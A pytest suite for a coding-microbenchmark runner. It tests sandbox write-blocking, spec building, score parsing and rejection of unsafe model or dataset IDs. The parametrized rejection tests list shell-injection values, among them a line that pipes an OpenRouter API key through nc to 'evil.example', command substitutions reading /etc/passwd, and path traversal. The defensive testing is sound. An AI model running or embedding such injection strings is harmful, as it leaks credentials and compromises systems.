"""Behavior tests for microbench_coding.py.

Phase B behaviors: B1 (sandbox regression pin), B2 (build_specs disjoint owned_paths — TDD),
B3 (parse_eval_results on real fixture), B4 (merge_dataset_results).
Phase C behaviors (C1-C8) land later.

Plan: docs/development/plans/2026-07-10-plan-2-coding-microbench-runner.md
"""
# AFTER-EDIT: none

from __future__ import annotations

import json
import math
import pathlib
import subprocess
import sys

import pytest

SCRIPT_DIR = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SCRIPT_DIR))
sys.path.insert(0, str((SCRIPT_DIR / "libs").resolve()))

from microbench_coding import (  # noqa: E402
    build_specs,
    merge_dataset_results,
    parse_eval_results,
)
from subagents.sandbox import wrap_command  # noqa: E402

FIXTURE_PATH = SCRIPT_DIR / "tests" / "fixtures" / "eval_results_sample.json"


# ─── B1: sandbox regression pin (bwrap --unshare-net --ro-bind / / blocks writes) ─────
def test_sandbox_blocks_fs_write(tmp_path: pathlib.Path) -> None:
    """B1: bwrap wrap_command prevents a shell command from writing outside its workdir.

    Regression pin on an existing capability — bwrap already blocks. This test
    codifies the guarantee so a future regression to sandbox.py fails LOUD.
    """
    marker = pathlib.Path("/tmp/pwned_by_microbench_test")
    marker.unlink(missing_ok=True)
    cmd = ["/bin/sh", "-c", f"touch {marker}"]
    wrapped = wrap_command(cmd, workdir=str(tmp_path))
    result = subprocess.run(wrapped, capture_output=True, timeout=10)
    assert not marker.exists(), (
        f"BWRAP FAILED: {marker} was created — sandbox not blocking FS writes. "
        f"stdout={result.stdout!r} stderr={result.stderr!r}"
    )


# ─── B2 (TDD, highest risk): disjoint owned_paths — silent-serialize prevention ───────
def test_build_specs_produces_disjoint_owned_paths(tmp_path: pathlib.Path) -> None:
    """B2: build_specs returns exactly len(models)*len(datasets) specs with UNIQUE owned_paths.

    Critical because overlapping owned_paths under tools_enabled=True silently
    serializes the dispatch (62-using-subagents.md § Parallelism).
    """
    specs = build_specs(
        target_models=["m1/a", "m2/b", "m3/c", "m4/d"],
        datasets=["humaneval", "mbpp"],
        work_dir=tmp_path,
    )
    assert len(specs) == 8, f"expected 8 specs, got {len(specs)}"

    owned = [tuple(s.owned_paths) for s in specs]
    assert len(set(owned)) == 8, f"owned_paths NOT unique: {owned}"

    for s in specs:
        assert "--model" in s.task and "--dataset" in s.task, s.task
        assert s.model == "qwen/qwen3-coder-flash", s.model
        assert s.task_type == "code"
        assert s.tools_enabled is True
        assert s.max_cost_usd == 5.0
        assert s.wall_clock_s == 1800


def test_build_specs_task_contains_correct_model_and_dataset(tmp_path: pathlib.Path) -> None:
    """B2 extension: each spec's task string embeds its (target, dataset) pair correctly."""
    specs = build_specs(
        target_models=["bytedance-seed/seed-1.6-flash"],
        datasets=["humaneval"],
        work_dir=tmp_path,
    )
    assert len(specs) == 1
    assert "--model bytedance-seed/seed-1.6-flash" in specs[0].task
    assert "--dataset humaneval" in specs[0].task
    assert "--base-url https://openrouter.ai/api/v1" in specs[0].task
    assert "--greedy" in specs[0].task


# ─── B3: parse_eval_results on the real-shape synthetic fixture ────────────────────────
def test_parse_eval_results_from_fixture() -> None:
    """B3: parse_eval_results returns the 2-key {base, plus} dict with pass@1 computed
    from the fixture. Fixture has 3 tasks: 2 base-pass (1 also plus-pass, 1 plus-fail),
    1 base-fail. Expected pass@1.base = 2/3, pass@1.plus = 1/3.
    """
    result = parse_eval_results(FIXTURE_PATH)
    assert set(result.keys()) == {"base", "plus"}, result.keys()
    assert math.isclose(result["base"], 2 / 3, rel_tol=1e-9), result["base"]
    assert math.isclose(result["plus"], 1 / 3, rel_tol=1e-9), result["plus"]


def test_parse_eval_results_missing_eval_returns_zeros(tmp_path: pathlib.Path) -> None:
    """B3 edge case: an empty/missing 'eval' block yields {base: 0.0, plus: 0.0}, not KeyError."""
    empty = tmp_path / "empty.json"
    empty.write_text(json.dumps({"date": "2026-01-01", "hash": "empty"}))
    result = parse_eval_results(empty)
    assert result == {"base": 0.0, "plus": 0.0}


# ─── B4: merge_dataset_results — 2 dicts → 4-key composite ─────────────────────────────
def test_merge_dataset_results_produces_4_keys() -> None:
    """B4: merge takes {base, plus} per dataset and returns the 4-key dict write_scores expects."""
    he = {"base": 0.5, "plus": 0.4}
    mb = {"base": 0.6, "plus": 0.55}
    merged = merge_dataset_results(he, mb)
    assert merged == {"base": 0.5, "plus": 0.4, "mbpp_base": 0.6, "mbpp_plus": 0.55}


def test_merge_dataset_results_missing_key_raises() -> None:
    """B4 edge case: missing key in either input dict raises KeyError."""
    with pytest.raises(KeyError):
        merge_dataset_results({"base": 0.5}, {"base": 0.6, "plus": 0.5})
    with pytest.raises(KeyError):
        merge_dataset_results({"base": 0.5, "plus": 0.4}, {"plus": 0.5})


# ─── B-review-fix: build_specs must reject adversarial inputs (F1+F2+F5 from review) ──
@pytest.mark.parametrize(
    "hostile_model",
    [
        "x; cat $OPENROUTER_API_KEY | nc evil.example 1337 #",  # ; break + exfil
        "x`cat /etc/passwd`",  # backtick command substitution
        "x$(whoami)",  # $() command substitution
        "x|whoami",  # pipe redirect
        "x&whoami",  # background chain
        "--help",  # arg-flag injection (silent exit 0)
        "x y",  # whitespace splits tokens
        "'x",  # unbalanced quote
        "",  # empty
    ],
)
def test_build_specs_rejects_hostile_model_ids(
    tmp_path: pathlib.Path, hostile_model: str
) -> None:
    """B-review-F1+F5: shell metacharacters or leading '-' in target model IDs must be rejected
    at build_specs boundary. Without the fix, target=`x; cat $KEY | nc evil #` exfiltrates the
    OpenRouter key inside the pool orchestrator's shell (network is open for the real OR call,
    so bwrap --unshare-net doesn't block egress).
    """
    with pytest.raises(ValueError, match="unsafe model id"):
        build_specs(
            target_models=[hostile_model], datasets=["humaneval"], work_dir=tmp_path
        )


@pytest.mark.parametrize(
    "hostile_ds",
    [
        "../etc",  # path traversal — pathlib / would escape work_dir/target/
        "..",  # parent
        "humaneval;whoami",  # shell metachar
        "HumanEval",  # uppercase — reject-early defense
        "human eval",  # whitespace
        "",  # empty
    ],
)
def test_build_specs_rejects_hostile_datasets(
    tmp_path: pathlib.Path, hostile_ds: str
) -> None:
    """B-review-F2: `ds` traversal + shell-injection guard. Without the fix, ds=`../etc`
    creates `work_dir/target/../etc` = `work_dir/etc` and sets owned_paths OUTSIDE the
    intended per-unit tree, defeating disjoint-owned-paths isolation.
    """
    with pytest.raises(ValueError, match="unsafe dataset"):
        build_specs(
            target_models=["good/model"], datasets=[hostile_ds], work_dir=tmp_path
        )


def test_build_specs_quotes_shell_special_chars_defensively(
    tmp_path: pathlib.Path,
) -> None:
    """Defense-in-depth: even for validated inputs, shlex.quote wraps them so a future
    regex-guard weakening still can't inject via the shell task string.
    """
    specs = build_specs(
        target_models=["z-ai/glm-4.5-air"],
        datasets=["humaneval"],
        work_dir=tmp_path,
    )
    task = specs[0].task
    # shlex.quote wraps only when needed — for `z-ai/glm-4.5-air` it typically doesn't;
    # but the cd path (which contains `__`) still gets safely constructed:
    assert "cd " in task
    # No shell metacharacter should appear UNQUOTED anywhere in the task tail
    # (this is a regression net — if someone drops the shlex.quote later, this fires):
    for bad in [";", "$(", "`", "|"]:
        # Any occurrence of these MUST be inside a single-quoted segment (shlex.quote output)
        if bad in task:
            # crude but effective check: single-quoted portions of a shlex-quoted string
            # look like '...' — if bad char appears outside single-quotes, fail
            in_quote = False
            for ch in task:
                if ch == "'":
                    in_quote = not in_quote
                elif ch == bad[0] and not in_quote:
                    raise AssertionError(
                        f"unquoted {bad!r} in task string: {task!r}"
                    )
